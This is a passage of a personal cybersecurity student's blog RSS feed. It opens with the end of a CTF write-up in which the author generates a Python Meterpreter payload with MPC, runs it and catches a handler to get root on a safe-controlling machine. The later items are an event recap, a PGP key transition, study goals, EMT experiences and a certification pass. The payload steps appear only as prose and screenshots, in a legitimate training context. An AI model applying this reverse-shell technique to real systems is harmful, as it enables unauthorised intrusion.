+<p><img src="images/Selection_344.png" alt=""></p>
+<p>With the knowledge at hand, the next step was to generate a Python payload by using MPC.</p>
+<p><img src="images/Selection_350.png" alt=""></p>
+<p>The file was then downloaded using wget, and renamed using &ldquo;mv python-meterpreter* open_safe.py&rdquo;</p>
+<p><img src="images/Selection_348.png" alt=""></p>
+<p>The file permissions of the Python payload was then set to be executable.</p>
+<p><img src="images/Selection_353.png" alt=""></p>
+<p>Next, the payload handler was started using the generated .rc file by MPC.</p>
+<p><img src="images/Selection_349.png" alt=""></p>
+<p>Hoorah! We got r00t.</p>
+<p><img src="images/Selection_352.png" alt=""></p>
+<p>With a root shell, the file system was further enumerated. After reviewing the .bash_history file, the presence of open.py was found in the &ldquo;/opt/RBS/safe&rdquo;. Python open.py was then executed, with the message of &ldquo;[!] Access Granted.&rdquo;. Hoorah, we got in!</p>
+<p>Now I hurried over to the safe, however it did not open. After going back to my terminal and reviewing the code, it seems the safe closes after one second. One of our team members hit the key to execute the file, while I went to open the safe. In hindsight, I could of modified the file and increased the sleep time.</p>
+<p>Finally, it seems we were not supposed to actually root the system and instead symlink the open.py file to open_safe.py within the billy home directory. Although, I was in the OSCP rooting mode from the past 40 days spent in the lab, so automatically went to root the system!.</p>
+<p>A very fun day indeed. Feel free to email me any questions or send me a tweet.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>MASPTv2 - Mobile Application Security and Penetration Testing Course</title>
+            <link>https://jamesit.github.io/2016/10/16/masptv2-mobile-application-security-and-penetration-testing-course/</link>
+            <pubDate>Sun, 16 Oct 2016 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2016/10/16/masptv2-mobile-application-security-and-penetration-testing-course/</guid>
+            <description>So about three weeks ago I won an &amp;ldquo;Elite&amp;rdquo; edition of the new mobile penetration testing course from eLearnSecurity by watching their webinar and being randomly selected. I&amp;rsquo;m really excited about this course and have been getting started now that it&amp;rsquo;s been released. I really did not expect to win either!
+This really helps being on a student budget, and will be relevant to the mobile development module at Abertay University next semester, I&amp;rsquo;ll be posting a review once I finish and pass the course.</description>
+            <content type="html"><![CDATA[<p>So about three weeks ago I won an &ldquo;Elite&rdquo; edition of the new mobile penetration testing course from eLearnSecurity by watching their webinar and being randomly selected. I&rsquo;m really excited about this course and have been getting started now that it&rsquo;s been released. I really did not expect to win either!</p>
+<p><img src="images/maspt-300x72.png" alt="maspt"></p>
+<p>This really helps being on a student budget, and will be relevant to the mobile development module at Abertay University next semester, I&rsquo;ll be posting a review once I finish and pass the course. However so far, the course looks pretty solid with plenty of videos, slides and virtual labs with real world vulnerable applications.</p>
+<p>Having completed eCPPT from eLearnSecurity in 2014, I know for sure that this would be another excellent course.</p>
+<p>Will keep the blog up to date with more information, stay tuned!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>SHU CTF - Cyber Security Challenge</title>
+            <link>https://jamesit.github.io/2016/10/16/shu-ctf-cyber-security-challenge/</link>
+            <pubDate>Sun, 16 Oct 2016 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2016/10/16/shu-ctf-cyber-security-challenge/</guid>
+            <description>Yesterday I participated in a capture the flag event at Sheffield Hallam University organised by Cyber Security Challenge UK, it was a really interesting experience for my first in person CTF and I took away some points and advice for future CTF&amp;rsquo;s and things I need to look at and research. I arrived at around 9:30am and got myself signed in and then had some pre-game coffee (Very important before the CTF!</description>
+            <content type="html"><![CDATA[<p>Yesterday I participated in a capture the flag event at Sheffield Hallam University organised by Cyber Security Challenge UK, it was a really interesting experience for my first in person CTF and I took away some points and advice for future CTF&rsquo;s and things I need to look at and research. I arrived at around 9:30am and got myself signed in and then had some pre-game coffee (Very important before the CTF!!) once everyone started arriving eventually the hosts talked about the schedule for the day, the rules and what prizes are on offer.</p>
+<p><img src="images/IMG_0124-300x225.jpg" alt="img_0124"></p>
+<p>We then moved towards the lab, and I found my team members for the CTF. Unfortunately my own university&rsquo;s team from Abertay University were already full due to it being 4 members per team, so I was on a mixed team with students from SHU. After a brief introduction and creating our team name &ldquo;Invaderz&rdquo;, I got stuck straight into the challenges and worked on the miscellaneous and forensics challenges. The CTF was using a web app with different categories of challenges and each challenge represented a various amount of points.to score for the team, during the first few hours we was making progress and each of us scoring points which caused us to hold second place with Abertay University (Team Russel) holding first place.</p>
+<p>We then had lunch after making some progress during the morning, and listened to a talk on WiFi leakage which was interesting to find out how much data our devices leak without us realising it, and the OSINT information that could be gathered.</p>
+<p>After a quick charge up of energy and some more coffee (of course), we then made our way back to the hack lab and I started to work on the Wireshark forensics challenge, which seemed to be more challenging than I thought after spending half an hour trying to get the attachment decoded, and rebuilt from the pcap file. It did not help that Kali 2.0 was used in the labs and we could not update/install software due to the repo not working, and once I changed the sources to old kali 2.0 repo the software I needed would not install. So after looking into some more tools and commands I found some other software.</p>
+<p>Then we were approached by staff to go and attempt to pick the lock for the lock picking challenge, with a chance to win more points. Off we went to attempt the challenge and was given a brief talk/demonstration on lock picking. After I tried to pick the lock, I managed to bend one of the tools&hellip; Which was not a good start, after one of us picked the lock we gave up and went back to the CTF to try and keep in the game and get to 2nd place. Time was running out at this point with only a few hours to go, so we was all desperately trying various challenges to try and rack up more points.</p>
+<p>It then came up to the last ten minutes and I was trying as hard as I could to try and work out where the flag was in this pcap file, at this point we was still third which was not so bad. However&hellip; it then came to the last two minutes and one team had an ace up their sleeve and submitted a few flags which brought us into forth place with a 30 points difference.</p>
+<p><img src="images/2016-10-15-20_09_38-Raytheon-CTF-_-Scoreboard-300x136.png" alt="2016-10-15-20_09_38-raytheon-ctf-_-scoreboard"></p>
+<p>And that was it! A spectacular day, I learned loads and got to work with like minded people. It was also nice to see our university came first place (Shame I was not on that team!!). After speaking to other teams once it finished, it seemed I was looking in the wrong place in the pcap file, and actually had to login to an email and download the flag and not trying to download a attachment from the pcap file, which is why it was not working.</p>
+<p>I will certainly be back next time!!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>PGP Transition Statement</title>
+            <link>https://jamesit.github.io/2016/09/15/pgp-transition-statement/</link>
+            <pubDate>Thu, 15 Sep 2016 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2016/09/15/pgp-transition-statement/</guid>
+            <description>-&amp;mdash;-BEGIN PGP SIGNED MESSAGE&amp;mdash;&amp;ndash; Hash: SHA256
+OpenPGP Key Transition Statement for James Hemmings / james@hemmings.pw
+I have created a new OpenPGP key and will be transitioning away from my old key. The old key has not been compromised and will continue to be valid for a short period of time, but I prefer all future correspondence to be encrypted to the new key, and will be making signatures with the new key going forward.</description>
+            <content type="html"><![CDATA[<p>-&mdash;-BEGIN PGP SIGNED MESSAGE&mdash;&ndash; Hash: SHA256</p>
+<p>OpenPGP Key Transition Statement for James Hemmings / <a href="mailto:james@hemmings.pw">james@hemmings.pw</a></p>
+<p>I have created a new OpenPGP key and will be transitioning away from my old key. The old key has not been compromised and will continue to be valid for a short period of time, but I prefer all future correspondence to be encrypted to the new key, and will be making signatures with the new key going forward.</p>
+<p>The reason for the new key transition is to increase encryption from 2048 RSA to 4096 RSA.</p>
+<p>I would like this new key to be re-integrated into the web of trust. This message is signed by both keys to certify the transition. My new and old keys are signed by each other. If you have signed my old key, I would appreciate signatures on my new key as well, provided that your signing policy permits that without re-authenticating me. The old keys, which I am transitioning away from, is:</p>
+<p>pub 2048R/8F8C3666 2014-08-03 Key Fingerprint = 3BED844069C9A894F91D88F792992F4A8F8C3666</p>
+<p>The new keys, to which I am transitioning, is:</p>
+<p>pub 4096R/AEDC917C 2016-09-15 Key Fingerprint = CF06336569FB80B16F5B7BAECCF606D6AEDC917C</p>
+<p>The entire key may be downloaded from: <a href="https://jameshemmings.co.uk/docs/AEDC917C.txt">https://jameshemmings.co.uk/docs/AEDC917C.txt</a></p>
+<p>To fetch the full new key from a public key server using GnuPG, run:</p>
+<p>gpg &ndash;keyserver keys.gnupg.net &ndash;recv-key AEDC917C</p>
+<p>If you already know my old key, you can now verify that the new key is signed by the old one:</p>
+<p>gpg &ndash;check-sigs AEDC917C</p>
+<p>If you are satisfied that you&rsquo;ve got the right key, and the User IDs match what you expect, I would appreciate it if you would sign my key:</p>
+<p>gpg &ndash;sign-key AEDC917C</p>
+<p>You can upload your signatures to a public keyserver directly:</p>
+<p>gpg &ndash;keyserver keys.gnupg.net &ndash;send-key</p>
+<p>Or email <a href="mailto:james@hemmings.pw">james@hemmings.pw</a>(possibly encrypted) the output from:</p>
+<p>gpg &ndash;armor &ndash;export</p>
+<p>If you&rsquo;d like any further verification or have any questions about the transition please contact me directly.</p>
+<p>To verify the integrity of this statement:</p>
+<p>wget -q -O- <a href="https://jameshemmings.co.uk/docs/key">https://jameshemmings.co.uk/docs/key</a>_transition-2016-09-15.txt|gpg &ndash;verify</p>
+<p>Regards, James Hemmings Twitter: @MrJamesHemmings Email: <a href="mailto:james@hemmings.pw">james@hemmings.pw</a> WWW: jameshemmings.co.uk &mdash;&ndash;BEGIN PGP SIGNATURE&mdash;&ndash; Version: GnuPG v2</p>
+<p>iQEcBAEBCAAGBQJX2oSgAAoJEJKZL0qPjDZmEG8H/A3zBhChCSCsBtJcxE6N7gqO go+jri7kPxLJFlGKhoesAVqzPikEB9Vnev/tn6iXxSrEzdYYu73tt8Wiasi4l5jW T7NlHRR0oWgIWoU50ynRi7+OSxk3OwaMpo/DYdfl8SAtJ+TGMyOt+udA44lBXUG0 o1jl+IHKVBzJuw6iCHrkEAJYDFXeh4FQHF9yhE+izbXy8xqnXHmUJDUGT6CLbuFg ikHpU+Dz6KcU8NJRngKCTMI9+xlWatxoECE2AreqoHe5zYg9Dc3XsODe1xolQDJg geFa8docHjhttr1JY/OG71IX1omjnE6T2xsZ7w3bCAVUgiDDwJ7UftsX2Ln8DZaJ AhwEAQEIAAYFAlfahKAACgkQ/Mr1JCokEO8QbxAAkAsFAZeiboDIEDe0sdVH1WJK zBjcpy+9KdSmZIR71YP3t/SOJ8PjZCt/Q+pNiyI2fc6i9SvQld3/35MsPf+m2ZyC 78za5rhYcWYFZLF+LOwiecZXNfxLNUzIs6bfhFezXxPHFeGVyZgbhryt+8Hqw+wZ T8b8K24i78KOW1tqMmvEPO3v7HJxoYNURO26tA75EIaGWVOiHBJvIM8MjpwTih/b lZD3vZpAWPNlTvquEFimLQYV8fTZbmZUiHrZaFN8HIBYqhe/XKLK57RiiZ6CqBjr pq/iuzVwctMOqVN3BQth/5tqRxxZ/WIUcJ+1pL6YZ5sbvMZAmX7NqJi6+7hrGvJi L2czJleciX1OkBS/kpeck+nkpgPu+gXKnVClHB6jvnZaNhMy2aSb95/mtuRiwfJW ZNMEHVAAVHPHwro769dB2m5m4bww3dR6syGkj9tOuyZQ7l/7eugEj4bJgp2ga/Jt MRdoavOfpLdpDxbH2+/XTSH/CCiIjGPvYnHuHr8thqLnzvmNi+a1KJ9c70+/awqx IvOOLzQdgY9rm+tNWZebg9SCDUD+N5QZuFtfwjhHo+Kt6+t5BjjYDwFzgyKcPnlk 8CHUuq/UHtoP4kwZiSstM2JLYYazTMkTmAzPamCYGgI7kGJ2amzSnwpDKqU6GfQ8 NpC2RAVNBTHEe8yt+rc= =gAMr &mdash;&ndash;END PGP SIGNATURE&mdash;&ndash;</p>
+<p>PGP Statement for Verification: <a href="https://www.jameshemmings.co.uk/docs/key_transition-2016-09-15.txt">https://www.jameshemmings.co.uk/docs/key_transition-2016-09-15.txt</a></p>
+<p>Public Key: <a href="https://www.jameshemmings.co.uk/docs/AEDC917C.txt">https://www.jameshemmings.co.uk/docs/AEDC917C.txt</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Goals for 2016/2017</title>
+            <link>https://jamesit.github.io/2016/08/20/goals-for-2016/2017/</link>
+            <pubDate>Sat, 20 Aug 2016 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2016/08/20/goals-for-2016/2017/</guid>
+            <description>Just been thinking about my plans for this year, and been thinking about taking OSCP over the summer period to help increase my skills in the penetration testing field. It seems to be a really good challenging course, which tests your abilities and with it being valuable to employers, something I should do and is the logical next step after the eLearnSecurity eCPPT course I did last year.
+https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/
+ Anyone else took this course before?</description>
+            <content type="html"><![CDATA[<p>Just been thinking about my plans for this year, and been thinking about taking OSCP over the summer period to help increase my skills in the penetration testing field. It seems to be a really good challenging course, which tests your abilities and with it being valuable to employers, something I should do and is the logical next step after the eLearnSecurity eCPPT course I did last year.</p>
+<p><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/</a></p>
+<p> </p>
+<p>Anyone else took this course before? Post in the comments with your thoughts.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>US Year Abroad Trip</title>
+            <link>https://jamesit.github.io/2016/07/28/us-year-abroad-trip/</link>
+            <pubDate>Thu, 28 Jul 2016 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2016/07/28/us-year-abroad-trip/</guid>
+            <description>Just thought I&amp;rsquo;d make a post regarding what I&amp;rsquo;ve been up to this year. I have been in the United States Of America since July 2015 for a study abroad program which I was very lucky to be accepted onto, and have been making the most of this opportunity since I got here. I completed two Semesters at the Pennsylvania College Of Technology and have also been working as an EMT for the college responding to 911 emergencies and volunteering with the fire department.</description>
+            <content type="html"><![CDATA[<p>Just thought I&rsquo;d make a post regarding what I&rsquo;ve been up to this year. I have been in the United States Of America since July 2015 for a study abroad program which I was very lucky to be accepted onto, and have been making the most of this opportunity since I got here. I completed two Semesters at the Pennsylvania College Of Technology and have also been working as an EMT for the college responding to 911 emergencies and volunteering with the fire department.</p>
+<p>Some may wonder why I have been volunteering as an EMT/Firefighter and wondering if that&rsquo;s what I want to do instead of Cyber Security. However, I find it important to be able to do things outside of studying and going out of your comfort zone is very important. Being able to do something new and exciting and learn important skills is what drew me to volunteering as well as making a difference in the local community and paying my way back for being able to come to the USA.</p>
+<p><img src="images/ff-300x300.jpg" alt="ff"></p>
+<p>I&rsquo;ve learnt so many skills from being part of the US 911 system, such as leadership, teamwork, being outside comfort zone, and attention to detail.</p>
+<p>I still have another month back before I leave the US, and I&rsquo;ve come to realise just how I love it here. The people, culture and different way of doing things really has grown on me and I hope to come back and live in the USA, working in the cyber security field here.</p>
+<p>I&rsquo;m very proud to have completed all the goals I set before coming to the USA by finishing college in the US and passing Vehicle Rescue, Firefighter I, and EMT-B. I created a video below, which sums up what I&rsquo;ve been up to with the Fire Department.</p>
+<p><a href="https://www.youtube.com/watch?v=k5IR5gRMqbU">https://www.youtube.com/watch?v=k5IR5gRMqbU</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>American EMS</title>
+            <link>https://jamesit.github.io/2015/08/09/american-ems/</link>
+            <pubDate>Sun, 09 Aug 2015 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2015/08/09/american-ems/</guid>
+            <description>I’m now in the United States Of America, and have completed EMT-Basic at Pelham Training. It’s been an amazing experience, especially participating in clinical rotations at Monroe Emergency Room and Owens County EMS. During my shift we were dispatched to difficulty breathing and unfortunately for me that was the only call we got for the entire shift, one thing I did notice was they send ambulances on lights and sirens for mostly all calls, and then on way back to hospital decide if lights and sirens will be needed, where as in the UK the calls get categorised.</description>
+            <content type="html"><![CDATA[<p>I’m now in the United States Of America, and have completed EMT-Basic at Pelham Training. It’s been an amazing experience, especially participating in clinical rotations at Monroe Emergency Room and Owens County EMS. During my shift we were dispatched to difficulty breathing and unfortunately for me that was the only call we got for the entire shift, one thing I did notice was they send ambulances on lights and sirens for mostly all calls, and then on way back to hospital decide if lights and sirens will be needed, where as in the UK the calls get categorised..</p>
+<p>I’ve also noticed other things while in America, such as the minor differences in protocols such as the shock position where as in the UK the legs are raised, to supposedly bring flow back to the central core, however research in the US suggests this is ineffective and would only send around 50ml to the heart and increase blood pressure slightly but cardiac output would not be increased. There is also some differences in equipment in the Ambulances and at the moment King airways and combitubes are used by EMTs and not i-gels which are far superior and easy to use.</p>
+<p>I’m really excited to start volunteering as an EMT here in the USA, and will soon be signing up to the local fire department (OLFC) in Williamsport. Just need to get the NREMT final exam complete, then gain state certification.</p>
+<p>Well, that’s it for now! Will keep the blog updated, more as I progress in US EMS.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Passed CompTIA Security&#43;</title>
+            <link>https://jamesit.github.io/2015/01/06/passed-comptia-security-/</link>
+            <pubDate>Tue, 06 Jan 2015 00:00:00 +0000</pubDate>
+            
+            <guid>https://jamesit.github.io/2015/01/06/passed-comptia-security-/</guid>
+            <description>I decided to schedule the exam for today as I felt I was ready, and after taking the exam I scored 825/900! Which is a pretty decent score, although I am going to re-go over the two topics I didn&amp;rsquo;t do so good in.
+Overall after taking the exam, I felt it was pretty easy after my three weeks of study. I used a combination of Darril Gibson&amp;rsquo;s book, Professer Messer Videos along with flashcards.</description>
+            <content type="html"><![CDATA[<p>I decided to schedule the exam for today as I felt I was ready, and after taking the exam I scored 825/900! Which is a pretty decent score, although I am going to re-go over the two topics I didn&rsquo;t do so good in.</p>
+<p>Overall after taking the exam, I felt it was pretty easy after my three weeks of study. I used a combination of Darril Gibson&rsquo;s book, Professer Messer Videos along with flashcards. I would recommend anyone who is planning to take this exam however, to make sure Network+ is taken before or another networking certification as there is some knowledge which cross&rsquo;s over.</p>
+<p>My next certification? Well, I am unsure at the moment however I am tempted to either study for Linux+ or start to focus on Python and take the SecurityTube Python Scripting Expert, or OSCP. (Depending on funds). University Life and all!</p>
+<p>That&rsquo;s all for now.</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
